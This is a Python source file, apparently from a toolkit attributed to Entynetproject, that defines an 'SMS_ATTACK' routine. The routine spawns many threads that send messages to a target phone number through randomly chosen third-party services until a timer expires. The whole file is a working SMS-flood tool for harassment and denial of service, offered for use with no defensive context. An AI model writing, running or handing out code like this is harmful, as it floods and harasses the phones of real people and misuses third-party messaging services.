#!/usr/bin/env python3

# MIT License
#
# Copyright (C) 2019-2020, Entynetproject. All Rights Reserved.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import time
from threading import Thread
# Import modules for SMS & CALL flood
import tools.SMS.sendRequest as request
import tools.SMS.numberTools as number
import tools.SMS.randomData  as randomData

def SMS_ATTACK(threads, attack_time, phone):
	# Finish
	global FINISH
	FINISH = False
	threads_list = []

	# Get services list
	services = request.getServices()
	# Make for Russian numbers
	phone = number.normalize(phone)
	# Get country name by phone
	country = number.getCountry(phone)
	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting SMS flood to number: " + phone + "...")

	# Send SMS
	def sms_flood():
		while not FINISH:
			service = randomData.random_service(services)
			service = request.Service(service)
			service.sendMessage(phone)


	# Start threads
	for thread in range(threads):
		print("\033[1;34m"+"[*]"+"\033[0m"+" Starting thread " + str(thread) + "...")
		t = Thread(target = sms_flood)
		t.start()
		threads_list.append(t)
	# Sleep selected secounds
	try:
		time.sleep(attack_time)
	except KeyboardInterrupt:
		FINISH = True
	# Terminate threads
	for thread in threads_list:
		FINISH = True
		thread.join()
	
	print("\033[1;33m"+"[!]"+"\033[0m"+" Attack stopped!")
